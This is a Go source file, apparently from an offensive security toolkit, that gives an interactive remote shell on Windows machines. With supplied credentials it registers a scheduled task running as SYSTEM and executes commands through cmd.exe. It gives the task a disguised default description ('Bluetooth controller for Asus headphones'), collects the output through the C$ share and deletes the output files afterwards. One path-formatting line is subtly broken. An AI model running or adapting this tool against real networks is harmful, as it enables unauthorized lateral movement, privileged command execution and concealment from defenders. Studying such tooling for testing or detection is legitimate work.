package main

import (
	"bufio"
	"fmt"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"log"
	"os"
	"time"
)

func handleTaskSession(target string, batch bool, username string, password string, domain string, taskname string, description string, runas bool) {
	// TODO - Abstract some of the handles to avoid constant reconnection
	if taskname == "" {
		taskname = getRandomString(18)
	}
	settings := &Settings{
		User:        fmt.Sprintf("%s\\%s", domain, username),
		Password:    password,
		TargetShare: "ADMIN$",
		Target:      target,
	}

	if !EstablishConnection(settings, "C$", true) {
		fmt.Printf("failed to establish connection to C$ share on %s", settings.Target)
		return
	}
	defer EstablishConnection(settings, "C$", false)
	log.Printf("Successfully connected to C$ share on %s\n", target)

	err := createRemoteScheduledTask(target, taskname, username, password, domain, description, runas)
	if err != nil {
		fmt.Printf("Failed to create task: %v\n", err)
		return
	}
	fmt.Printf("Successfully created task %s at %s \n", taskname, target)

	for true {
		fmt.Printf("task@%s: ", target)
		var command string
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			command = scanner.Text()
		}
		if command == "exit" || command == "quit" || command == "q" {
			fmt.Println("quitting...")
			break
		}
		if command == "" {
			fmt.Println()
			continue
		}
		outputFileBase := fmt.Sprintf("Windows\\Temp\\%s.txt", getRandomString(12))
		outputFile := fmt.Sprintf("\\\\%s\\C$\\%s", target, outputFileBase)
		cmd := fmt.Sprintf("%s > %s 2>&1", command, outputFile)
		batchFileBase := fmt.Sprintf("Windows\\Temp\\%s", target, getRandomString(18))
		batchFile := fmt.Sprintf("\\\\%s\\C$\\%s", target, batchFileBase)
		if batch {
			// Make a batch file on the target at C:\Windows\Temp and then we will pass a command to execute this
			f, err := os.Create(batchFile)
			if err != nil {
				fmt.Println(err.Error())
				continue
			}
			// "C:\Windows\System32\cmd.exe /k start /b /wait \\127.0.0.1\C$\Windows\Temp\1.bat & timeout /t 10"
			f.WriteString(fmt.Sprintf("%s > %s 2>&1", command, outputFile))
			f.Close()

			cmd = fmt.Sprintf("%s", batchFile)
		}
		err = runTask(target, taskname, username, password, domain, cmd, runas, false)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				fmt.Println(err.Error())
				continue
			}
		}
		// run task waits until complete so we should be good to check output immediately
		// We loop and check service status every X time period waiting for completion
		// When we aren't using explicit credentials for SMB transfers
		c, err := readFileToSlice(outputFile)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		for _, v := range c {
			fmt.Println(v)
		}
		// Now we delete the output file
		err = deleteFile(outputFile)
		if err != nil {
			fmt.Println(err.Error())
		}

	}

}

func createRemoteScheduledTask(hostname, taskName, username, password, domain, description string, runas bool) error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		return fmt.Errorf("failed to create Schedule.Service: %v", err)
	}
	defer unknown.Release()

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("failed to query IDispatch: %v", err)
	}
	defer service.Release()

	if hostname == "." || hostname == "localhost" || hostname == "127.0.0.1" {
		_, err = oleutil.CallMethod(service, "Connect") // localhost
	} else if username == "" {
		_, err = oleutil.CallMethod(service, "Connect", hostname, "root\\cimv2")
	} else {
		_, err = oleutil.CallMethod(
			service,
			"Connect",
			hostname, // strServer
			username, // strUser
			domain,   // strDomain
			password, // strPassword
		)
	}
	if err != nil {
		return fmt.Errorf("failed to connect to remote host %s: %v", hostname, err)
	}

	rootFolderDisp, err := oleutil.CallMethod(service, "GetFolder", `\`)
	if err != nil {
		return fmt.Errorf("failed to get root folder: %v", err)
	}
	rootFolder := rootFolderDisp.ToIDispatch()
	defer rootFolder.Release()

	taskDefDisp, err := oleutil.CallMethod(service, "NewTask", 0)
	if err != nil {
		return fmt.Errorf("failed to create new task: %v", err)
	}
	taskDef := taskDefDisp.ToIDispatch()
	defer taskDef.Release()

	// Principal
	principalDisp, err := oleutil.GetProperty(taskDef, "Principal")
	if err != nil {
		return fmt.Errorf("failed to get Principal: %v", err)
	}
	principal := principalDisp.ToIDispatch()
	//oleutil.PutProperty(principal, "LogonType", 3) // TASK_LOGON_INTERACTIVE_TOKEN
	runasUser := fmt.Sprintf("%s\\%s", domain, username)
	if runas {
		oleutil.PutProperty(principal, "UserId", runasUser)
		oleutil.PutProperty(principal, "LogonType", 1) // TASK_LOGON_PASSWORD
		oleutil.PutProperty(principal, "RunLevel", 1)  // TASK_RUNLEVEL_HIGHEST
	} else {
		oleutil.PutProperty(principal, "UserId", "SYSTEM")
		oleutil.PutProperty(principal, "LogonType", 5) // TASK_LOGON_SERVICE_ACCOUNT
		oleutil.PutProperty(principal, "RunLevel", 1)  // TASK_RUNLEVEL_HIGHEST
	}

	principal.Release()

	// RegistrationInfo (optional)
	regInfoDisp, _ := oleutil.GetProperty(taskDef, "RegistrationInfo")
	regInfo := regInfoDisp.ToIDispatch()
	if description == "" {
		description = "Bluetooth controller for Asus headphones"
	}
	oleutil.PutProperty(regInfo, "Description", description)
	regInfo.Release()

	// Settings
	settingsDisp, _ := oleutil.GetProperty(taskDef, "Settings")
	settings := settingsDisp.ToIDispatch()
	oleutil.PutProperty(settings, "Enabled", true)
	oleutil.PutProperty(settings, "StartWhenAvailable", true)
	oleutil.PutProperty(settings, "Hidden", false)
	//oleutil.PutProperty(settings, "DeleteExpiredTaskAfter", "PT1M") // Delete 1 minute after end for auto-deletion - don't want to do this in our case
	settings.Release()

	// Trigger
	// We create the start trigger as a date extremely far in the future because we will be running this on-demand for commands
	triggersDisp, _ := oleutil.GetProperty(taskDef, "Triggers")
	triggers := triggersDisp.ToIDispatch()
	defer triggers.Release()
	startTime := time.Now().UTC().Add(10000 * time.Hour)
	endTime := startTime.Add(5 * time.Minute)
	startBoundary := startTime.Format("2006-01-02T15:04:05")
	endBoundary := endTime.Format("2006-01-02T15:04:05")
	triggerDisp, _ := oleutil.CallMethod(triggers, "Create", 1) // TIME_TRIGGER_ONCE
	trigger := triggerDisp.ToIDispatch()
	oleutil.PutProperty(trigger, "StartBoundary", startBoundary)
	oleutil.PutProperty(trigger, "EndBoundary", endBoundary)
	oleutil.PutProperty(trigger, "Enabled", true)
	trigger.Release()

	// Actions
	actionsDisp, _ := oleutil.GetProperty(taskDef, "Actions")
	actions := actionsDisp.ToIDispatch()
	defer actions.Release()
	actionDisp, _ := oleutil.CallMethod(actions, "Create", 0) // TASK_ACTION_EXEC
	action := actionDisp.ToIDispatch()
	oleutil.PutProperty(action, "Path", "cmd.exe")
	//oleutil.PutProperty(action, "Arguments", fmt.Sprintf("/c %s", commandLine)) // When we create, we don't want to run anything (yet)
	action.Release()

	// Register task
	var registeredTask *ole.VARIANT
	if runas {
		registeredTask, err = oleutil.CallMethod(
			rootFolder,
			"RegisterTaskDefinition",
			taskName,
			taskDef,
			6, // TASK_CREATE_OR_UPDATE | TASK_RUN
			runasUser,
			password,
			1, // TASK_LOGON_PASSWORD
			"",
		)
	} else {
		registeredTask, err = oleutil.CallMethod(
			rootFolder,
			"RegisterTaskDefinition",
			taskName,
			taskDef,
			6,   // TASK_CREATE_OR_UPDATE | TASK_RUN
			nil, // No user
			nil, // No password
			5,   // TASK_LOGON_SERVICE_ACCOUNT
			"",
		)
	}
	if err != nil {
		if comErr, ok := err.(*ole.OleError); ok {
			return fmt.Errorf("failed to register task: HRESULT 0x%X (%v)", comErr.Code(), comErr)
		}
		return fmt.Errorf("failed to register task: %v", err)
	}
	defer registeredTask.Clear()

	return nil
}

func runTask(hostname, taskName, username, password, domain, command string, runas, skipcheck bool) error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		return fmt.Errorf("failed to create Schedule.Service: %v", err)
	}
	defer unknown.Release()

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("failed to query IDispatch: %v", err)
	}
	defer service.Release()

	if hostname == "." || hostname == "localhost" || hostname == "127.0.0.1" {
		_, err = oleutil.CallMethod(service, "Connect") // localhost
	} else if username == "" {
		_, err = oleutil.CallMethod(service, "Connect", hostname, "root\\cimv2")
	} else {
		_, err = oleutil.CallMethod(
			service,
			"Connect",
			hostname, // strServer
			username, // strUser
			domain,   // strDomain
			password, // strPassword
		)
	}
	if err != nil {
		return fmt.Errorf("failed to connect to remote host %s: %v", hostname, err)
	}

	rootFolderDisp, err := oleutil.CallMethod(service, "GetFolder", `\`)
	if err != nil {
		return fmt.Errorf("failed to get root folder: %v", err)
	}
	rootFolder := rootFolderDisp.ToIDispatch()
	defer rootFolder.Release()

	taskDisp, err := oleutil.CallMethod(rootFolder, "GetTask", taskName)
	if err != nil {
		return fmt.Errorf("failed to get task: %v", err)
	}
	task := taskDisp.ToIDispatch()
	defer task.Release()

	definitionDisp, err := oleutil.GetProperty(task, "Definition")
	if err != nil {
		return fmt.Errorf("failed to get task definition: %v", err)
	}
	definition := definitionDisp.ToIDispatch()
	defer definition.Release()

	actionsDisp, err := oleutil.GetProperty(definition, "Actions")
	if err != nil {
		return fmt.Errorf("failed to get Actions: %v", err)
	}
	actions := actionsDisp.ToIDispatch()
	defer actions.Release()

	countVar, err := oleutil.GetProperty(actions, "Count")
	if err != nil {
		return fmt.Errorf("failed to get actions count: %v", err)
	}
	actionCount := int(countVar.Val)
	if actionCount == 0 {
		return fmt.Errorf("task has no actions to edit")
	}

	// Edit the first action
	actionDisp, err := oleutil.GetProperty(actions, "Item", 1)
	if err != nil {
		return fmt.Errorf("failed to get action item: %v", err)
	}
	action := actionDisp.ToIDispatch()
	defer action.Release()

	oleutil.PutProperty(action, "Path", "cmd.exe")
	oleutil.PutProperty(action, "Arguments", fmt.Sprintf("/c %s", command))

	// Re-register the updated task (TASK_CREATE | TASK_UPDATE = 6)
	if runas {
		_, err = oleutil.CallMethod(
			rootFolder,
			"RegisterTaskDefinition",
			taskName,
			definition,
			6, // TASK_CREATE_OR_UPDATE | TASK_RUN
			fmt.Sprintf("%s\\%s", domain, username),
			password,
			1, // TASK_LOGON_PASSWORD
			"",
		)
	} else {
		_, err = oleutil.CallMethod(
			rootFolder,
			"RegisterTaskDefinition",
			taskName,
			definition,
			6,   // TASK_CREATE_OR_UPDATE | TASK_RUN
			nil, // No user
			nil, // No password
			5,   // TASK_LOGON_SERVICE_ACCOUNT
			"",
		)
	}
	if err != nil {
		if comErr, ok := err.(*ole.OleError); ok {
			return fmt.Errorf("failed to register task: HRESULT 0x%X (%v)", comErr.Code(), comErr)
		}
		return fmt.Errorf("failed to register task: %v", err)
	}

	// Run the updated task
	runningDisp, err := oleutil.CallMethod(task, "Run", nil)
	if err != nil {
		return fmt.Errorf("failed to run updated task: %v", err)
	}
	running := runningDisp.ToIDispatch()
	defer running.Release()

	if skipcheck {
		return nil
	}
	for {
		_, _ = oleutil.CallMethod(running, "Refresh") // This is, allegedly, called automatically prior to checking State property but it seems to not work properly

		stateVar, err := oleutil.GetProperty(running, "State")
		if err != nil {
			return fmt.Errorf("failed to get task state: %v", err)
		}
		state := int(stateVar.Val)
		stateVar.Clear()
		if state != 4 && state != 5 { // TASK_STATE_RUNNING or TASK_STATE_QUEUED
			break
		}
		time.Sleep(1 * time.Second)
	}
	return nil
}
